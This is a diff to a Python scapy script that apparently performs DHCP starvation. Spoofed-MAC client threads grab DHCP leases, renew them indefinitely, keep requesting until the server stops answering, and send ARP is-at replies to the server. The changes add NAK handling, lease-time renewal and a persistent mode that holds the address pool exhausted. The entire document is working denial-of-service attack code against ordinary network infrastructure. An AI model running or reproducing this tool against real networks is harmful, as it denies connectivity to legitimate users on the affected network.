@@ -1,3 +1,4 @@
+import os
 import sys
 from random import randint
 from threading import Thread
@@ -14,11 +15,9 @@ from scapy.volatile import RandMAC
 
 OFFER = 2
 ACK = 5
+NAK = 6
 
-TIMEOUT = 0.5
-
-
-# class Client():
+TIMEOUT = 0.1
 
 
 class Client(Thread):
@@ -46,35 +45,34 @@ class Client(Thread):
         """
         self.discover()
         offer_packet = self.sniffer(OFFER)
+
         if not offer_packet:
             return  # if timeout occurs stop the current thread
 
         self.ip = offer_packet[BOOTP].yiaddr  # get the ip address from the offer packet
-        time_for_release = 0
+        self.request()
+        ack_packet = self.sniffer(ACK)
+        if not ack_packet:
+            sys.exit()
+        self.ip = ack_packet[BOOTP].yiaddr  # if the server gave us a different IP
+
+        time_for_release = ack_packet[DHCP].lease_time
+        # every loop we renew the same ip address
         while True:  # renew the lease infinite times
             sleep(time_for_release * 0.5)  # wait for 50% of the lease time
             self.request()
             ack_packet = self.sniffer(ACK)
-            if not ack_packet:  # if timeout occurs
-                return
-
-            if ack_packet[BOOTP].yiaddr != self.ip:  # if the server gave us a different IP
-                self.ip = ack_packet[BOOTP].yiaddr
-
-            time_for_release = ack_packet[DHCP].lease_time
-            self.request()
-            ack_packet = self.sniffer(ACK)
-            if ack_packet:  # receive ack packet
+            if ack_packet:  # receive ack packet successfully
                 time_for_release = ack_packet[DHCP].lease_time
+                self.ip = ack_packet[BOOTP].yiaddr  # if the server gave us a different IP
                 self.send_is_at_arp()
-                sleep(time_for_release * 0.5)  # wait for 50% of the lease time and send a new request
                 continue  # renew the lease
-            else:  # timeout occurs
+            else:  # not receiving ack
                 sleep(time_for_release * (0.885 - 0.5))  # wait for 88.5% of the lease time
                 self.request()
                 ack_packet = self.sniffer(ACK)
-                if not ack_packet:  # receive ack packet
-                    return
+                if not ack_packet:  # if not receive ack packet
+                    sys.exit()  # close current thread
                 time_for_release = ack_packet[DHCP].lease_time
 
     def sniffer(self, op):
@@ -87,21 +85,26 @@ class Client(Thread):
             UDP in p and
             p[UDP].sport == 67 and  # the packet is from server (OFFER or ACK)
             p[BOOTP].xid == self.transaction_id and  # the packet is for the current client
-            p.options[0][1] == op,
+            dict([ops for ops in p[DHCP].options if len(ops) == 2])['message-type'] in [op, NAK],
         )
 
-        if len(packets) == 0:  # if timeout occurs
+        if len(packets) == 0 or dict(
+                [ops for ops in packets[0][DHCP].options if len(ops) == 2]
+        )['message-type'] == NAK:  # if timeout occurs or we receive NAC
             if not Client.persist:
                 # if not persistent the program terminated when the server is down
-                sys.exit()
-            if Client.lock.acquire(blocking=True, timeout=TIMEOUT):
+                os._exit(0)
+            # all the threads that came here when its lock going to kill
+            elif Client.lock.acquire(blocking=True, timeout=TIMEOUT):
                 # stop create clients, DHCP server is down
                 print('========= LOCK Locked =========')
-                sleep(TIMEOUT * 5)  # try again after TIMEOUT * 5 seconds
+                sleep(TIMEOUT * 100)  # try again after TIMEOUT * 100 seconds (if real client disconnect)
                 Client.lock.release()
                 print('========= LOCK Release =========')
-            print(f'Lock: {Client.lock.locked()}')
-            return False
+                return False
+            else:  # if the lock is acquired that's mean that we send too many requests
+                # close current thread
+                sys.exit()
 
         else:
             return packets[0]
@@ -144,5 +147,5 @@ class Client(Thread):
 
     def send_is_at_arp(self):
         reply = ARP(op=2, hwsrc=self.mac, psrc=self.ip, hwdst=self.target_mac, pdst=self.target)
-        # Sends the is at message to the src_mac ()
+        # Sends the is at message to the server
         send(reply, iface=self.iface, verbose=0)
